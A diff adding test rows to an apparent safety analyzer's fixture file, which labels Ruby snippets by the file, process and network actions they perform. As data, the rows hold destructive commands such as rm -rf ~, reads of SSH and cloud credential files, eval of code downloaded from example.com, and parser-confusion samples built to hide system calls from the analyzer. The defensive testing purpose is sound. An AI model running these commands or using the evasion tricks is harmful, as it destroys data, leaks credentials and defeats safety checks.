@@ -114,3 +114,223 @@ javascript acts="javascript c(.c(''.(X%'''\"';c(=" understand=no | eval("c(.c(''
 # Literal code with an error raises before it runs: what is read beside it
 # is kept.
 javascript acts="javascript c(.c(''.(X%'''\"';c(=, remove /home/me" | const m = require('fs'); eval("c(.c(''.(X%'''\\"';c(="); m.rmSync('/home/me')
+
+# Ruby deletes: `File.delete` and `File.unlink` of each path, `FileUtils`
+# of a path or a list, `Dir.rmdir`, a `Pathname`'s `rmtree`.
+ruby acts="remove a" | File.delete("a")
+ruby acts="remove a, remove /tmp/b" | File.unlink('a', '/tmp/b')
+ruby acts="unread, remove /home/me" | require 'fileutils'\nFileUtils.rm_rf('/home/me')
+ruby acts="remove a, remove b" | FileUtils.rm(['a', 'b'])
+ruby acts="remove /home/me" | FileUtils::rm_r "/home/me"
+ruby acts="remove d" | FileUtils.remove_entry_secure('d')
+ruby acts="remove d" | FileUtils::Verbose.rmdir('d')
+ruby acts="remove d" | Dir.rmdir('d')
+ruby acts="remove /home/me" | Pathname.new('/home/me').rmtree
+ruby acts="remove /home/me/x" | Pathname('/home/me').join('x').unlink
+# With `include FileUtils`, its calls by their names alone.
+ruby acts="remove /home/me" | include FileUtils\nrm_rf '/home/me'
+# A path only known when the code runs; a name the code sets is one.
+ruby acts="remove ?" | File.delete(ARGV[0])
+ruby acts="remove ?" | d = '/home/me'\nFileUtils.rm_rf(d)
+ruby acts="remove ?" | FileUtils.rm(*files)
+
+# Ruby writes, reads, moves, links and changes permissions.
+ruby acts="write out.txt" | File.write('out.txt', 'x')
+ruby acts="write /etc/hosts" | IO.binwrite('/etc/hosts', 'x')
+ruby acts="write f" | File.open('f', 'w') { |f| f.puts 'x' }
+ruby acts="write f" | File.open('f', 'a+')
+ruby acts="write f" | File.open('f', File::WRONLY)
+ruby acts="write f" | File.new('f', mode: 'w')
+ruby acts="write f" | open('f', 'w')
+ruby acts="read f" | File.open('f') { |f| f.read }
+ruby acts="read f" | File.open('f', 'rb')
+ruby acts="read /home/me/.zshrc" | puts File.read('/home/me/.zshrc')
+ruby acts="read /home/me/.zshrc" | IO.readlines("/home/me/.zshrc")
+ruby acts="read /home/me/.zshrc" | File.foreach('/home/me/.zshrc') { |l| puts l }
+ruby acts="read f" | open('f').read
+ruby acts="write a/b, write c" | FileUtils.mkdir_p(['a/b', 'c'])
+ruby acts="write t" | FileUtils.touch 't'
+ruby acts="write d" | Dir.mkdir('d')
+ruby acts="read a, write /tmp/b" | FileUtils.cp('a', '/tmp/b')
+ruby acts="read-tree src, write /tmp/b" | FileUtils.cp_r('src', '/tmp/b')
+ruby acts="read a, write b" | IO.copy_stream('a', 'b')
+ruby acts="move a b" | File.rename('a', 'b')
+ruby acts="move a d, move b d" | FileUtils.mv(%w[a b], 'd')
+ruby acts="link t l" | File.symlink('t', 'l')
+ruby acts="link t l" | FileUtils.ln_sf('t', 'l')
+ruby acts="chmod 755 a, chmod 755 b" | File.chmod(0755, 'a', 'b')
+ruby acts="chmod 700 f" | FileUtils.chmod(0o700, 'f')
+ruby acts="chmod u+x f" | FileUtils.chmod('u+x', ['f'])
+ruby acts="chown f" | File.chown(0, 0, 'f')
+ruby acts="chown f" | FileUtils.chown_R('me', 'staff', 'f')
+ruby acts="write /tmp/x" | Pathname.new('/tmp') / 'x' => p\nPathname.new('/tmp').join('x').write('y')
+# The paths it works out: `Dir.home`, `ENV['HOME']`, `File.join`,
+# `File.expand_path`, `+` and `#{…}`.
+ruby acts="read ~/.ssh/id_rsa" | File.read(ENV['HOME'] + '/.ssh/id_rsa')
+ruby acts="read ~/.ssh/id_rsa" | File.read(File.join(Dir.home, '.ssh', 'id_rsa'))
+ruby acts="read ~/.netrc" | File.read("#{Dir.home}/.netrc")
+ruby acts="read ~/.netrc" | File.read(File.expand_path('~/.netrc'))
+ruby acts="read ~/.aws/x" | File.read(File.expand_path('.aws/x', Dir.home))
+ruby acts="read /home/me/.ssh/*" | File.read('/home/me/.ssh/id_' + ARGV[0])
+ruby acts="read /home/me/.ssh/*" | File.read("/home/me/.ssh/#{name}")
+ruby acts="read a\nb" | File.read("a\nb")
+ruby acts="read a\\nb" | File.read('a\\nb')
+# A path given to a call it has no row for may be opened; a call that only
+# works a path out, or asks what is there, opens none.
+ruby acts="opaque /home/me/.ssh/id_rsa" | YAML.load_file('/home/me/.ssh/id_rsa')
+ruby acts="" | puts File.exist?('/home/me/.ssh/id_rsa')
+ruby acts="" | puts File.basename('/home/me/x')
+
+# Ruby runs programs: one string is a line a shell reads, more are a
+# program and its arguments; `chdir:` runs it from there, a redirect writes
+# or reads a file, and an environment given makes it a program started
+# with one.
+ruby acts="script rm -rf ~" | system("rm -rf ~")
+ruby acts="script rm -rf ~" | exec 'rm -rf ~'
+ruby acts="run rm -rf ~" | system('rm', '-rf', '~')
+ruby acts="run rm -rf ~" | Process.spawn(['rm', 'rm'], '-rf', '~')
+ruby acts="script ls" | Kernel.system('ls')
+ruby acts="script ls" | `ls`
+ruby acts="script ?" | x = `ls #{dir}`
+ruby acts="script rm a" | %x{rm a}
+ruby acts="script ?" | system(*cmd)
+ruby acts="in /tmp [script ls, write /etc/x]" | system('ls', chdir: '/tmp', out: '/etc/x')
+ruby acts="script sh, read /etc/x" | spawn('sh', :in => '/etc/x')
+ruby acts="started [script ls]" | system({'LD_PRELOAD' => '/tmp/x.so'}, 'ls')
+ruby acts="script ls" | IO.popen('ls')
+ruby acts="run ls -l" | IO.popen(['ls', '-l'])
+ruby acts="run ls" | IO.popen(['ls'])
+ruby acts="started [run ls]" | IO.popen([{'X' => '1'}, 'ls'])
+ruby acts="" | IO.popen('-')
+ruby acts="script ls" | Open3.capture2('ls')
+ruby acts="run git status" | Open3.popen3('git', 'status') { |i, o, e, t| }
+ruby acts="script ls, run cat f" | Open3.pipeline('ls', ['cat', 'f'])
+ruby acts="script ls" | open('|ls')
+ruby acts="script ls" | Kernel.open("|ls").read
+ruby acts="script ls" | IO.read('|ls')
+ruby acts="script ?" | open(ARGV[0])
+ruby acts="script ls" | File.read('|ls')
+ruby acts="script ls" | File.write('|ls', 'x')
+ruby acts="write out.txt" | File.read('out.txt', mode: 'w')
+ruby acts="read out.txt" | File.read('out.txt', mode: 'r')
+ruby acts="run kill -- -1" | Process.kill(:KILL, -1)
+ruby acts="run kill -- 9, run kill -- 10" | Process.kill('TERM', 9, 10)
+ruby acts="unread" | Process.kill(:KILL, pid)
+ruby acts="chdir /tmp, remove x" | Dir.chdir('/tmp')\nFile.delete('x')
+ruby acts="chdir /tmp, remove x" | Dir.chdir('/tmp') do\n  File.unlink 'x'\nend
+ruby acts="chdir ~" | Dir.chdir
+# The environment the code writes, and the programs started after it.
+ruby acts="environment, started [script ls]" | ENV['PATH'] = '/tmp'\nsystem('ls')
+ruby acts="environment" | ENV.delete('HOME')
+ruby acts="" | puts ENV['HOME']
+# Code run from a string: a literal is code of its own, read again; one the
+# code fetches from the network is downloaded; any other is not read.
+ruby acts="ruby File.delete('x')" | eval("File.delete('x')")
+ruby acts="ruby system('ls')" | Object.class_eval 'system(\\'ls\\')'
+ruby acts="unread" | eval(ARGV[0])
+ruby acts="downloaded" | eval(Net::HTTP.get(URI('https://example.com/a.rb')))
+ruby acts="unread, downloaded" | require 'open-uri'\neval(URI.open('https://example.com/a.rb').read)
+ruby acts="downloaded" | code = Net::HTTP.get(URI('https://example.com/a.rb'))\nbody = code\ninstance_eval(body)
+ruby acts="" | URI.open('https://example.com/a.json').read
+# What calls a method by another name, or loads code, is not read.
+ruby acts="unread" | require 'json'
+ruby acts="unread" | load './x.rb'
+ruby acts="unread" | send(:system, 'ls')
+ruby acts="unread" | Kernel.public_send(:exec, 'ls')
+ruby acts="unread" | m = method(:system)
+ruby acts="unread, script x" | alias s system\nsystem('x')
+ruby acts="unread" | $LOAD_PATH << '/tmp'
+ruby acts="unread" | ObjectSpace.each_object(Class) { }
+ruby acts="unread" | trap('EXIT', 'system("rm -rf ~")')
+ruby acts="" | trap('INT', 'IGNORE')
+ruby acts="unread" | x.()
+
+# Ruby code it cannot follow, or does not parse: unread alone.
+ruby acts="" | puts 1 + 1
+ruby acts="remove /home/me" | def f\n  FileUtils.rm_rf('/home/me')\nend
+ruby acts="remove /home/me" | [1].each { |x| File.delete('/home/me') }
+ruby acts="script rm -rf ~" | puts "#{system('rm -rf ~')}"
+ruby acts="unread" understand=no | def f(
+ruby acts="unread" understand=no | puts 'x
+# A magic comment that reads the code in another encoding: not read, when
+# the code is not all ASCII.
+ruby acts="unread" | # encoding: shift_jis\nputs 'é'
+ruby acts="" | # encoding: shift_jis\nputs 'e'
+ruby acts="" | # encoding: utf-8\nputs 'é'
+# A heredoc whose word the grammar's scanner cannot hold, and a literal
+# nested deeper than it keeps: not read.
+ruby acts="unread" | x = <<"É"\nfoo\nÉ\nsystem("rm -rf ~")
+ruby acts="unread" | x = <<É\nÉ\nsystem("rm -rf ~")
+# `__END__` ends the code only alone on its line, at its start: past any
+# other the code goes on, and is read again.
+ruby acts="" | puts 1\n__END__\nsystem('rm -rf ~')
+ruby acts="" | puts 1\n__END__\r\nsystem('rm -rf ~')
+ruby acts="ruby  x\nsystem('rm -rf ~')\n" | puts 1\n__END__ x\nsystem('rm -rf ~')\n
+ruby acts="ruby \rsystem('rm -rf ~')" | puts 1\n__END__\rsystem('rm -rf ~')
+ruby acts="ruby \nsystem('rm -rf ~')" | puts 1\n  __END__\nsystem('rm -rf ~')
+# Flags that are not only `RDONLY` may write.
+ruby acts="write f" | File.open('f', flags: File::TRUNC)
+ruby acts="write f" | File.open('f', 'r', flags: File::WRONLY | File::CREAT)
+ruby acts="read f" | File.open('f', flags: File::RDONLY)
+# A load path written, code loaded from data, and the interpreter's own
+# compiler are not read.
+ruby acts="unread" | $LOAD_PATH.unshift('/tmp/x')
+ruby acts="unread" | $:.push('/tmp/x')
+ruby acts="unread" | $LOAD_PATH.concat(['/tmp/x'])
+ruby acts="unread" | YAML.unsafe_load(data)
+ruby acts="unread" | Psych.unsafe_load_file('x.yml')
+ruby acts="unread" | Marshal.load(data)
+ruby acts="unread" | RubyVM::InstructionSequence.compile(code).eval
+# A `=begin` document the grammar ends at a line Ruby does not (any
+# `=end` of the pattern `[\s*]*=end`, in or out of a line's start), where Ruby
+# runs on to its own `=end`: the code between is not a string. Not read.
+ruby acts="unread" | =begin\n=endx\ny = "\n=end\nsystem('rm -rf ~') #"\nputs y
+ruby acts="unread" | =begin\n=end=\ny = "\n=end\nsystem('rm -rf ~') #"\nputs y
+ruby acts="unread" | =begin\n=end#\ny = "\n=end\nsystem('rm -rf ~') #"\nputs y
+ruby acts="unread" | =begin\n  =end\ny = "\n=end\nsystem('rm -rf ~') #"\nputs y
+ruby acts="unread" | =begin\n\t=end\ny = "\n=end\nsystem('rm -rf ~') #"\nputs y
+ruby acts="unread" | =begin\n*=end\ny = "\n=end\nsystem('rm -rf ~') #"\nputs y
+# A document Ruby and the grammar end at the same line is a comment.
+ruby acts="remove /home/me" | =begin\nnotes\n=end\nFile.delete('/home/me')
+ruby acts="remove /home/me" | =begin x\nnotes =\n=end y\nFile.delete('/home/me')
+# A shebang with switches: Ruby applies them when it runs a file (`-r` loads a
+# file first), and one without `ruby` in it is run as the program it names.
+ruby acts="unread" | #!ruby -r/tmp/evil\nputs 1
+ruby acts="unread" | #!/usr/bin/env ruby -I/tmp -rjson\nputs 1
+ruby acts="unread" | #!/bin/sh\nputs 1
+ruby acts="remove /home/me" | #!/usr/bin/env ruby\nFile.delete('/home/me')
+# A backslash before a line's end in a double-quoted string is dropped; one
+# before the delimiters of a `%q` is the delimiter.
+ruby acts="remove /home/me/work/repo/" | FileUtils.rm_rf("/home/me/work/repo/\\\n")
+ruby acts="remove /home/me/(x)" | File.delete(%q(/home/me/\\(x\\)))
+ruby acts="remove /home/me/[x]" | File.delete(%q[/home/me/\\[x\\]])
+# Ruby reads `\c`, `\C-` and `\M-` with the character after them, a quote
+# too, where the grammar reads two characters and ends the string at the next
+# quote: what Ruby runs between two quotes is a string to the grammar. Not
+# read, and not understood.
+ruby acts="unread" | x = "\\c"; y = "; system('touch /tmp/pwn'); z = "; w = 1 #"
+ruby acts="unread" | x = "\\C-"; y = "; system('touch /tmp/pwn'); z = "; w = 1 #"
+ruby acts="unread" | x = "\\M-"; y = "; system('touch /tmp/pwn'); z = "; w = 1 #"
+ruby acts="unread" | x = "\\M-\\C-"; y = "; system('touch /tmp/pwn'); z = "; w = 1 #"
+ruby acts="unread" | x = "\\c\\M-"; y = "; system('touch /tmp/pwn'); z = "; w = 1 #"
+# A control or meta escape followed by a letter or a digit ends where Ruby
+# ends it.
+ruby acts="remove /home/me" | x = "\\cA\\C-b\\M-c"\nFile.delete('/home/me')
+# Ruby reads `#$\` as the global `$\` interpolated: the next backslash starts an
+# escape, here `\c"`, which takes the quote.
+ruby acts="unread" | x = "#$\\\\c"; y = "; system('touch /tmp/pwn'); z = "; w = 1 #"
+ruby acts="unread" | x = "#$\\\\M-"; y = "; system('touch /tmp/pwn'); z = "; w = 1 #"
+ruby acts="unread" | x = "#$\\\\C-"; y = "; system('touch /tmp/pwn'); z = "; w = 1 #"
+ruby acts="unread" | x = %Q(#$\\\\c); y = %q(; system('touch /tmp/pwn'); z = ); w = 1 #)
+# After `#$\` the next backslashes are read two ways: the escapes pair up from
+# the first or from the second backslash.
+ruby acts="unread" | x = "#$\\\\\\\\c"; y = "; File.delete('/home/me'); z = "; w = 1 #"
+ruby acts="unread" | x = "#$\\\\\\\\\\\\\\\\M-"; y = "; File.delete('/home/me'); z = "; w = 1 #"
+# A `=begin` inside a document is checked too: Ruby has none there, the grammar
+# may read it past a space.
+ruby acts="unread" | =begin\n=beginx\n=end\nFile.delete('/home/me')
+ruby acts="remove /home/me" | =begin\n=begin\n=end\nFile.delete('/home/me')
+# A `=begin` that does not start its line is a comment to the grammar, where
+# Ruby has an error: not read, however it is placed.
+ruby acts="unread" | p 1 =begin\nsystem("id")\n=end
+ruby acts="remove /home/me" | puts "=begins"\nFile.delete('/home/me')
